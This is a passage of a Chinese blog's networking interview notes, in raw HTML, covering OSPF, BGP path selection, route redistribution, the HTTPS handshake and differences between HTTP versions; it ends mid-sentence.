不负载分担，回程不管，在哪配开销，来回路径不一致有问题吗（快手）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在A配，因为A发送时需要查看路由表，只有路由表中没有开销相同的路由才不会负载分担</span><br><span class=\"line\"></span><br><span class=\"line\">路由来回路径不一致虽然还是可以通信，但是可能会出现偶尔访问慢或规律丢包等现象。</span><br><span class=\"line\">因此可考虑配置路由优先级或冗余端口来实现主备。</span><br><span class=\"line\">但对安全设备来说，有影响，可能对应报文会被丢弃。</span><br><span class=\"line\"></span><br><span class=\"line\">华为中fw可以如下操作：</span><br><span class=\"line\">如果出现来回路径不一致情况，不管是在路由模式下，还是在透明模式下，此时默认都是开启的链路状态检测。要解决这个问题，关闭链路状态检测即可，即：</span><br><span class=\"line\">undo firewall session link-state check</span><br></pre></td></tr></table></figure>\n<h4 id=\"单区域网络类型p2p有几种lsa快手\"><a class=\"markdownIt-Anchor\" href=\"#单区域网络类型p2p有几种lsa快手\">#</a> 单区域网络类型 P2P 有几种 LSA (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">只有1类</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210537797.png\" alt=\"image-20221020210537797\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221020210832630.png\" alt=\"image-20221020210832630\"></p>\n<h4 id=\"54lsa常见类型快手\"><a class=\"markdownIt-Anchor\" href=\"#54lsa常见类型快手\">#</a> 5.4LSA 常见类型 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1类LSA 每台运行ospf协议的路由器都会产生，用于描述加入到OSPF进程中自身直连链路的状态。有路由和拓扑信息</span><br><span class=\"line\">2类LSA 携带DR的router-id，DR接口子网掩码，伪节点的邻居，单区域p2p是没有2类的，有路由和拓扑信息</span><br><span class=\"line\">3类LSA 在区域间传递LSA，只有路由信息</span><br><span class=\"line\">4类LSA ABR产生，描述了ASBR的位置，类似路由信息</span><br><span class=\"line\">5类LSA 外部LSA，携带重发布的路由信息，只有路由信息</span><br><span class=\"line\">7类LSA NSSA区域引入外部路由时产生</span><br></pre></td></tr></table></figure>\n<h4 id=\"55ospf防环快手\"><a class=\"markdownIt-Anchor\" href=\"#55ospf防环快手\">#</a> 5.5OSPF 防环 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">区域内通过spf防环</span><br><span class=\"line\">区域间通过：</span><br><span class=\"line\">\t区域间水平分割(1类，2类优于3类，骨干3类优于非骨干3类)</span><br><span class=\"line\">\t区域设计原则(非骨干必须和骨干直接相连)</span><br><span class=\"line\">\tABR(只有ABR能产生泛洪3类LSA)</span><br><span class=\"line\">区域间防环:</span><br><span class=\"line\">\t5类LSA在整个区域泛洪时link id,adv rtr,type 都不改变</span><br><span class=\"line\">\tASBR同一区域的路由器通过SPF计算出去往ASBR的无环路径，即通过1类2类防环</span><br><span class=\"line\">\tASBR不同区域的路由器通过4类LSA防环，4类防环规则与3类一致</span><br></pre></td></tr></table></figure>\n<h4 id=\"56spf算法快手\"><a class=\"markdownIt-Anchor\" href=\"#56spf算法快手\">#</a> 5.6SPF 算法 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/qq_57686163/article/details/123466172</span><br><span class=\"line\">这篇文章师傅写的很明白了，我不想写了，摆烂</span><br></pre></td></tr></table></figure>\n<h4 id=\"57drbdr宏杉\"><a class=\"markdownIt-Anchor\" href=\"#57drbdr宏杉\">#</a> 5.7DR，BDR (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">基于链路选择。即在每一条广播型链路或NBMA链路都需要进行DR，BDR选举，BDR可选存在。即在每一条广播型链路或NBMA链路上DR只有一个，BDR如果存在有且只有一个</span><br><span class=\"line\">DR只会从DR的合集当中竞选，BDR只会从BDR的合集当中竞选。如果集合当中有路由器，优先从集合当中竞选。</span><br><span class=\"line\"></span><br><span class=\"line\">DR选举(包含在hello包内)：  1.比较优先级 （范围：0-255，默认优先级为1 ，越大越优）  </span><br><span class=\"line\">2.比较各自的router-id，越大越优</span><br><span class=\"line\"></span><br><span class=\"line\">1.DR抢占是关闭的      </span><br><span class=\"line\">3.优先级范围0-255，数字为0代表不参与选举，默认为1，若两个直连路由器优先级都为0，则不能学习LSA，只能维持邻居关系  </span><br><span class=\"line\">4.先选举BDR ，再升级为DR  (BDR备份路由器，当BDR选举超过40秒后(=dead time),升级为DR，将剩下最优的作为BDR)</span><br><span class=\"line\">当DR BDR选举完成时，会给224.0.0.6发送组播传递LSA，且只有DR和BDR才会接收，DR和BDR在用224.0.0.5发送给所有</span><br></pre></td></tr></table></figure>\n<h4 id=\"58ospf建立邻居\"><a class=\"markdownIt-Anchor\" href=\"#58ospf建立邻居\">#</a> 5.8ospf 建立邻居</h4>\n<blockquote>\n<p>Down: 这是邻居的初始状态，表示没有从邻居收到任何信息。</p>\n<p>Init: 判断邻居参数可以建立邻居后 init。在此状态下，路由器已经从邻居收到了 Hello 报文，但是自己的 router-id 不在所收到的 Hello 报文的邻居列表中，表示尚未与邻居建立双向通信关系，可以称为 one-way。在此状态下的邻居要被包含在自己所发送的 Hello 报文的邻居列表中。</p>\n<p>2-Way: 在此状态下，收到邻居 hello 包，并从 hello 包中发现自己 router-id。两台路由器已确认可以双向通信，邻居关系已经建立；但是还没有建立邻接关系。若发送方收到的 hello 包中有自己 id，可以直接进入 two-way。这是建立邻接关系以前的最高级状态。如果网络为广播网络或者 NBMA 网络则选举 DR/BDR。drother 之间停留此状态，不会进行 LSDB 同步，其他情况会继续进行 LSDB 同步</p>\n<p>exstart 状态，开始发送 DBD 报文。主要完成主从选举，为可靠的 LSDB 同步做准备工作，不会携带任何 LSDB 中 LSA 头部信息</p>\n<p>exchange 主从选举完成后，一旦发送携带 LSA 头部的 DD 报文，则进入 exchange，slave 路由器开始发送携带自身 LSDB 中 LSA 的头部信息的 DBD 报文，并使用</p>\n<p>loading 状态发送 LSR，LSU，LSACK ，LSACK 中会将 LSU 的 Seq 作为自己的 seq，同时携带摘要作为显示确认</p>\n<p>FUll：LSR 重传列表为空，发送和接受 LSACK 报文后，防止同步出现问题。</p>\n<p>attempt— 过度状态，在某些不能发送的 hello 包的网络中，不能主动建立邻居。通过单播邻居方式建立，需要选 DR 时，等待选举状态为 attempt 状态</p>\n<p>停留 attempt 状态说明单播指邻居邻居指错</p>\n</blockquote>\n<h3 id=\"6bgp相关\"><a class=\"markdownIt-Anchor\" href=\"#6bgp相关\">#</a> 6.BGP 相关</h3>\n<h4 id=\"61origin属性network和import都是什么属性优先级origin控制选路快手\"><a class=\"markdownIt-Anchor\" href=\"#61origin属性network和import都是什么属性优先级origin控制选路快手\">#</a> 6.1origin 属性，network 和 import 都是什么属性，优先级，origin 控制选路 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定义路径信息的来源。描述该路由是用什么方式成为BGP路由的，公认必尊</span><br><span class=\"line\">1.将IGP路由network到BGP中     i</span><br><span class=\"line\">2.将EGP路由import到BPG中      e</span><br><span class=\"line\">3.将IGP路由import到BGP中      ?</span><br><span class=\"line\">选路时origin  i &gt; e &gt; ?</span><br><span class=\"line\">手动汇总路由继承明细路由中优先级最低起源属性，自动汇总origin全部为incomplete(?)</span><br></pre></td></tr></table></figure>\n<h4 id=\"bgp选路中科闻歌绿盟\"><a class=\"markdownIt-Anchor\" href=\"#bgp选路中科闻歌绿盟\">#</a> bgp 选路（中科闻歌，绿盟）</h4>\n<blockquote>\n<p>1. 优选协议首选值 (PrefVal) 最高的路由</p>\n<p>2. 优选本地优先级 (Local_Pref) 最高的路由</p>\n<p>3. 优选本地生成的路由，解决路由冲突，<strong>agg &gt; auto &gt; network &gt; import &gt; peer</strong></p>\n<p>4. 优选 AS 路径 (AS_Path）最短的路由</p>\n<p>5. 比较 Origin 属性，依次优选 Origin 类型为 IGP、EGP、Incomplete 的路由</p>\n<p>6. 优选 MED 值最低的路由</p>\n<p>7. 优选从 EBGP 邻居学来的路由 (EBGP 路由优先级高于 IBGP 路由)</p>\n<p>8. 优选到下一跳 IGP Metric 较小的路由</p>\n<p>----------------------------</p>\n<p>9. 优选 Cluster_List 最短的路由，没有簇列表簇列表为空，没有簇列表一定更优</p>\n<p>10. 优选起源 ID，越小越优</p>\n<p>11. 优选 Router lD 最小的路由器发布的路由</p>\n<p>12. 比较对等体的 IP Address，优选从具有较小 IP Address 的对等体学来的路由</p>\n<p>简单来说</p>\n<p>P L L A O M E N   漂亮老男人</p>\n<p>Pref LocalPre Local AS origin MED EBGP next_cost</p>\n</blockquote>\n<h3 id=\"7双点双向重发布快手\"><a class=\"markdownIt-Anchor\" href=\"#7双点双向重发布快手\">#</a> 7. 双点双向重发布 (快手)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在多点双向重发布中，若A协议的优先级大于（次）B协议，此时若将A协议通过一台ASBR引入到B协议时，那此优先级会降低（变优），会导致另一台ASBR路由表的生成，此时另一台ASBR再次将B往A协议重发布时，原先A协议的路由会再次回到A协议中--路由回馈</span><br><span class=\"line\">解决方案:将重发布进来的路由优先级改高--Cisco提出，在Cisco的EIGRP协议中，内部路由优先级90，外部170。所以，华为设备因为不支持EIGRP，仅支持OSPF，所以借鉴了Cisco的做法--在华为中，OSPF内部优先级10，外部150</span><br><span class=\"line\">OSPF协议学习OSPF网络内的所有环回接口网段时，学习到的都是32为的主机路由，但是将本设备工作在OSPF的直连接口重发布时时原本的掩码，</span><br><span class=\"line\">所以可能会导致在重发布时同一条路由条目变成不同的掩码发布到另一协议</span><br><span class=\"line\">解决方案：</span><br><span class=\"line\">1）修改环回接口掩码直接为32位 </span><br><span class=\"line\">2）修改环回接口的OSPF工作的网络类型</span><br><span class=\"line\">在进行多点双向重发布时，由于协议之间不兼容，因此原路由的度量值进入新协议时，会被起始度量代替，所以存在选路不佳的问题</span><br><span class=\"line\">解决方案：需要人为的干涉选路---路由策略技术</span><br><span class=\"line\">注意：BGP与OSPF或其他协议做多点多向重发布，会出现瞬时环路。</span><br><span class=\"line\">就是BGP收敛慢，OSPF收敛快，两个协议启动会存在时差，在这个时差内协议的边界路由器是没有BGP协议的路由，那么在协议边界路由上就存在路由黑洞</span><br></pre></td></tr></table></figure>\n<h3 id=\"8httphttps相关问题\"><a class=\"markdownIt-Anchor\" href=\"#8httphttps相关问题\">#</a> 8.http/https 相关问题</h3>\n<h4 id=\"http状态码汉得曙光\"><a class=\"markdownIt-Anchor\" href=\"#http状态码汉得曙光\">#</a> http 状态码 (汉得，曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常见状态码          </span><br><span class=\"line\">200\t请求成功</span><br><span class=\"line\">301 永久重定向</span><br><span class=\"line\">302 临时重定向</span><br><span class=\"line\">400 请求错误，通常是访问的域名未绑定引起</span><br><span class=\"line\">403 禁止访问</span><br><span class=\"line\">404 请求的内容未找到或已删除</span><br><span class=\"line\">500 服务器端程序错误</span><br><span class=\"line\">502 网关无响应</span><br><span class=\"line\">503 服务器端临时错误</span><br><span class=\"line\">504\t网关超时</span><br><span class=\"line\">https://seo.juziseo.com/doc/http_code/</span><br></pre></td></tr></table></figure>\n<h4 id=\"访问网页过程信锐汉得\"><a class=\"markdownIt-Anchor\" href=\"#访问网页过程信锐汉得\">#</a> 访问网页过程 (信锐，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先在浏览器地址栏中输入URL或者域名。</span><br><span class=\"line\">2.电脑开始域名解析：</span><br><span class=\"line\">看查找IP是否是本机。不是再去查询浏览器缓存，本机hosts文件，如果有对应的IP则进行反馈，然后进行下一步。如果本机Hosts文件不含有，则本机向发出一个DNS请求到本地DNS服务器。</span><br><span class=\"line\">DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果。如果没有，本地DNS服务器还要向DNS根服务器进行查询。</span><br><span class=\"line\">根DNS服务器没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。</span><br><span class=\"line\">最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</span><br><span class=\"line\">网址真正的解析过程为:  . -&gt; .com -&gt; Microsoft.com. -&gt; www.Microsoft.com. </span><br><span class=\"line\">3.进行tcp三次握手</span><br><span class=\"line\">上面八股文你有写过，自己看吧</span><br><span class=\"line\">4.http/https请求和返回</span><br><span class=\"line\">HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。</span><br><span class=\"line\">https = http + tls，具体下面有写，这边就不写了，开摆</span><br><span class=\"line\">浏览器对服务器发出HTTP请求报文</span><br><span class=\"line\">发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。</span><br><span class=\"line\">服务器处理请求并返回HTTP响应报文</span><br><span class=\"line\">后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTP Request对象，供上层使用。HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。</span><br><span class=\"line\">5.浏览器渲染页面</span><br><span class=\"line\">浏览器在收到HTML,CSS,JS文件后，浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。</span><br></pre></td></tr></table></figure>\n<h4 id=\"https长亭\"><a class=\"markdownIt-Anchor\" href=\"#https长亭\">#</a> https (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTPS是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。</span><br><span class=\"line\">https = http + tls</span><br><span class=\"line\">tls 位于传输层上层</span><br><span class=\"line\">HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。</span><br><span class=\"line\">HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式：</span><br><span class=\"line\">1、TCP 三次同步握手</span><br><span class=\"line\">2、客户端验证服务器数字证书</span><br><span class=\"line\">3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</span><br><span class=\"line\">4、SSL 安全加密隧道协商完成</span><br><span class=\"line\">5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>1、客户端发起 HTTPS 请求</strong></p>\n<p>就是用户在浏览器里输入一个 https 网址，然后连接到 server 的 443 端口。</p>\n<p><strong>2、服务端的配置</strong></p>\n<p>采用 HTTPS 协议的服务器必须要有一套<em>数字证书</em>，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面 (startssl 就是个不错的选择，有 1 年的免费服务)。</p>\n<p><em>这套证书其实就是一对公钥和私钥</em>，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。</p>\n<p><strong>3、传送证书</strong></p>\n<p>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。</p>\n<p><strong>4、客户端解析证书</strong></p>\n<p>这部分工作是有客户端的 TLS 来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>\n<p>如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。</p>\n<p><strong>5、传送加密信息</strong></p>\n<p>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。</p>\n<p><strong>6、服务端解密信息</strong></p>\n<p>服务端用私钥解密后，得到了客户端传过来的随机值 (私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。</p>\n<p><strong>7、传输加密后的信息</strong></p>\n<p>这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。</p>\n<p><strong>8、客户端解密信息</strong></p>\n<p>客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022105328092.png\" alt=\"image-20221022105328092\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS93M2Nub3RlL2h0dHAtdnMtaHR0cHMuaHRtbA==\">HTTP 与 HTTPS 的区别 | 菜鸟教程 (runoob.com)</span></p>\n<h4 id=\"httphttps区别没人问我自己问着玩\"><a class=\"markdownIt-Anchor\" href=\"#httphttps区别没人问我自己问着玩\">#</a> http/https 区别 (没人问，我自己问着玩)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</span><br><span class=\"line\"></span><br><span class=\"line\">使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</span><br><span class=\"line\"></span><br><span class=\"line\">http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</span><br></pre></td></tr></table></figure>\n<h4 id=\"http1011和20区别长亭\"><a class=\"markdownIt-Anchor\" href=\"#http1011和20区别长亭\">#</a> http1.0,1,1 和 2.0 区别 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1.0和1.1之间的区别</span><br><span class=\"line\">1.缓存策略:</span><br><span class=\"line\">http1.0的缓存策略主要是依赖header中的If-Modiified-Since,Expire(到期)</span><br><span class=\"line\">http1.1的缓存策略要比http1.0略多,例如 Entity tag(实体标签), If-Unmodified-Since, If-Match, If-None-Match等.</span><br><span class=\"line\">2. 宽带和网络连接优化:</span><br><span class=\"line\">http1.0中会存在一些性能浪费,比如我们的只需要对象中的一部分,但是每次请求返回的却是整个对象,这无疑造成了性能的损害</span><br><span class=\"line\">http1.1则不然,它可以通过在请求头处设置range头域,就可以返回请求资源的某一部分,也就是返回码为206(Partial Content)的时候,这对于性能优化很有必要.</span><br><span class=\"line\">这里所谓的请求资源的一部分,也就是大家常说的断点续传</span><br><span class=\"line\">关于断点续传的应用场景,例如用户需要下载一个大文件,最佳的方式是将这个大文件分割成几部分,然后由多个进程同时进行.</span><br><span class=\"line\">这个时候,我们可以在请求头中设置range字段,来规定分割的byte数范围.</span><br><span class=\"line\">而服务端会给客户端返回一个包含着content-range的响应头,来对应相应的分割byte数范围</span><br><span class=\"line\">请求头中:</span><br><span class=\"line\">Range: bytes=0-801 // 一般请求下载整个文件是bytes=0- 或不用这个头</span><br><span class=\"line\">响应头中:</span><br><span class=\"line\">Content-Range: bytes 0-800/801 //801:文件总大小</span><br><span class=\"line\">3. 新增部分错误通知:</span><br><span class=\"line\">http1.1版本新增了24个错误状态响应码,比如</span><br><span class=\"line\">409(Conflict)表示: 请求的资源与当前的状态发生冲突</span><br><span class=\"line\">410(Gone)表示服务器上某个资源被永久性的删除了</span><br><span class=\"line\">4.Host头处理:</span><br><span class=\"line\">http1.0中默认每台服务器都绑定唯一的一个IP地址,所以请求消息中url并没有传递主机名,也就是hostname.</span><br><span class=\"line\">http1.1中请求消息和响应消息都支持Host头域,而且,如果我们不传这个字段还会报一个400(bad request)的状态码</span><br><span class=\"line\">通用头域:</span><br><span class=\"line\">Cache-Control: 缓存头域 =&gt; 常见值为no-cache(不允许缓存), no-store(无论请求还是响应均不允许缓存), max-age(规定可以客户端可以接受多长生命期的数据)</span><br><span class=\"line\">Keep-Alive: 使得服务端和客户端的链接长时间有效</span><br><span class=\"line\">Date: 信息发送的时间</span><br><span class=\"line\">Host: 请求资源的主机IP和端口号</span><br><span class=\"line\">Range: 请求资源的某一部分</span><br><span class=\"line\">User-Agent: 发出请求的用户的信息(鉴权)</span><br><span class=\"line\">5. 长连接:</span><br><span class=\"line\">http1.1支持长连接和请求的流水线(pipelining),在一个TCP链接上可以传送多个http请求和响应.这样就不用多次建立和关闭TCP连接了.</span><br><span class=\"line\"></span><br><span class=\"line\">2.1.x和2.0的区别</span><br><span class=\"line\">http1的解析是基于文本协议的各式解析,而http2.0的协议解析是二进制格式,更加的强大</span><br><span class=\"line\">多路复用(Mutiplexing) : 一个连接上可以有多个request,且可以随机的混在一起,每个不同的request都有对应的id,服务端可以通过request_id来辨别,大大加快了传输速率</span><br><span class=\"line\">header压缩: http1.x中的header需要携带大量信息.而且每次都要重复发送.http2.0使用encode来减少传输的header大小.而且客户端和服务端可以各自缓存(cache)一份header filed表,避免了header的重复传输,还可以减少传输的大小.</span><br><span class=\"line\">服务端推送(server push): 可以通过解析html中的依赖,只能的返回所需的其他文件(css或者js等),而不用再发起一次请求.</span><br><span class=\"line\">Keep-Alive：</span><br><span class=\"line\">Keep-Alive 是使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，而不是为每一个新的请求/应答打开新的连接的方法。我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成 之后立即断开连接（ HTTP 协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接）时，Keep-Alive 功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。</span><br><span class=\"line\"></span><br><span class=\"line\">总结：</span><br><span class=\"line\">HTTP1.0</span><br><span class=\"line\">浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接</span><br><span class=\"line\">HTTP1.1</span><br><span class=\"line\">引入了持久连接，即TCP连接默认不关闭，可以被多个请求复用</span><br><span class=\"line\">在同一个TCP连接里面，客户端可以同时发送多个请求</span><br><span class=\"line\">虽然允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的，服务器只有处理完一个请求，才会接着处理下一个请求。如果前面的处理需要时间特别长特别慢，后面的请求只能排队等着</span><br><span class=\"line\">新增了一些请求方法put、delete、options</span><br><span class=\"line\">新增了一些请求头和响应头</span><br><span class=\"line\">HTTP2.0</span><br><span class=\"line\">采用二进制格式而非文本格式</span><br><span class=\"line\">完全多路复用，而非有序并阻塞的、只需一个连接即可实现并行</span><br><span class=\"line\">使用报头压缩，降低开销</span><br><span class=\"line\">服务器可以推送</span><br><span class=\"line\">链接：https://juejin.cn/post/7089068858241515551</span><br></pre></td></tr></table></figure>\n<h4 id=\"http报文组成长亭-头行\"><a class=\"markdownIt-Anchor\" href=\"#http报文组成长亭-头行\">#</a> http 报文组成 (长亭) 头行</h4>\n<blockquote>\n<p>HTTP 请求报文是由三部分组成: <strong>请求行</strong>，<strong>请求报头</strong>和<strong>请求正文</strong>。</p>\n<p>后端从在固定的端口接收到 TCP 报文开始，这一部分对应于编程语言中的 socket。它会对 TCP 连接进行处理，对 HTTP 协议进行解析，并按照报文格式进一步封装成 HTTP Request 